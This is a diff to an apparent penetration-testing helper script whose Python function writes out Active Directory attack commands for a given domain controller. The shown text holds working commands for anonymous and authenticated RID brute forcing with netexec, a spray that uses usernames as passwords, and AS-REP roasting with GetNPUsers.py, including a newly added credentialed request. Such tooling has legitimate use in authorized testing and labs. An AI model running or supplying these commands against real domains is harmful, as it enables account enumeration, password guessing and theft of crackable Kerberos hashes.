@@ -33,14 +33,13 @@ def create_ad_enumeration_file(target_ip, hostname, domain, local_ip, user, pass
         if not has_creds:
             f.write("# Guest RID brute\n")
             f.write(f"netexec smb {domain} -u anonymous -p '' --rid-brute 10000 | tee rid.txt\n")
-            f.write(f"lookupsid.py {domain}/anonymous@{target_ip} | tee -a rid.txt\n")
         else:
             f.write("# Authenticated RID brute\n")
             f.write(f"netexec smb {domain} -u {user} -p '{password}' --rid-brute 10000 | tee rid.txt\n")
-            f.write(f"lookupsid.py {domain}/{user}:'{password}'@{target_ip} | tee -a rid.txt\n")
+
 
         # Extract usernames and groups from RID output with sed
-        f.write("# Clean up RID results from rid.txt\n")
+        f.write("# Clean up usernames/groups from RID output\n")
         f.write(r"sed -n 's/.*\\\([^ ]*\) (SidTypeUser).*/\1/p' rid.txt | sort -u > users.txt" + "\n")
         f.write(r"sed -n 's/.*\\\([^ ]*\) (SidType\(Group\|Alias\)).*/\1/p' rid.txt | sort -u > groups.txt" + "\n\n")
 
@@ -61,8 +60,13 @@ def create_ad_enumeration_file(target_ip, hostname, domain, local_ip, user, pass
             f.write("# Try your users list as a password list\n")
             f.write(f"netexec smb {domain} -u users.txt -p users.txt --continue-on-success\n\n")
 
-        # AS Rep Roasting
-        f.write("# AS Rep Roasting\n")
+        #AS-REP search when creds are available
+        if has_creds:
+            f.write(f"# AS-REP search when creds are available\n")
+            f.write(f"GetNPUsers.py -dc-ip {target_ip} -request {domain}/{user}:'{password}' | tee ASREP.out\n")
+
+        # AS Rep Roasting backup
+        f.write("# AS Rep Roasting raw users spray\n")
         f.write(f"for user in $(cat users.txt); do GetNPUsers.py -no-pass -dc-ip {target_ip} {domain}/${{user}} | grep -v Impacket; done\n\n")
 
         # Kerberoasting
